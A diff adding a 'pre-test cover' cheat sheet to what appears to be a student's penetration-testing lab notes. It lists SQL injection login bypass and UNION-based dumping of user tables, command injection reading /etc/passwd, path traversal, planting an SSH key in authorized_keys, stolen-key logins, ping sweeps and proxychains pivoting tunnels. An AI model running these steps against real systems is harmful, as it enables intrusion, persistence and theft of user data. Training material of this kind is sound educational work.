@@ -103,4 +103,25 @@ chmod 600 /home/student/stolenkey1_gun/.ssh/id_rsa.pub
 ssh -i /home/student/stolenkey1_gun/.ssh/id_rsa Comrade@192.168.150.253 -p 41011
 ssh -MS /tmp/jmp student@10.50.11.224 -L 41010:192.168.28.100:2222 -L 41011:192.168.150.253:3201
 
-#########
+############################################ PRE-TEST COVER ###################################
+First ip address is your target , not a jump box.
+Start off by nmapping the given IP, record ports.
+Netcat the found ports: nc 10.50.11.179 22
+# nmap --script=http-eum 10.50.11.179
+firefox -> 10.50.11.179 -> open a tab for every single tab
+You can do webpage.login.php?\StuffFoundInEnum and open those files.
+#Run an Authentication bypass on the login page. 'OR 1='1 -> ; whoami -> ; cat /etc/passwd , look for users home directory , user2 at bottom
+#File to read webpage: ../../../../../../../etc/passwd , /etc/hosts
+Malicious File upload: WebEx day 1
+Use SSH injection in order to get onto the machine -> ; mkdir -> ssh-kreygen -t rsa -b 4096 -> ; echo "" > /var/www/.ssh/authorized_keys
+#ssh -MS /tmp/t1 www-data@10.50.11.179
+on PFW machine: for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+Setup dynamic tunnel to scan new target: ## ssh -S /tmp/t1 t1 -O forward -D 9050
+scan new target: ## proxychains nmap 192.168.28.165,.1,.175
+##proxychains nc 192.168.28.165 22 
+##ssh -S /tmp/t1 t1 -O forward -L1111:192.168.28.175:2222 -L1112:192.168.38.175:8000
+firefox -> 127.0.0.1:1112
+Go through options, use GET method in order to find the correct one.
+# ?product=7 OR 1=1 -> UNION SELECT 1,2,3,4 # (error means take a number away) -> (1,3,2) table_schema.column,column_name.table_name from information.schema.columns #
+Duplicate the tab in order to save information, # UNION SELECT user_id,name,username from siteusers.users #
+
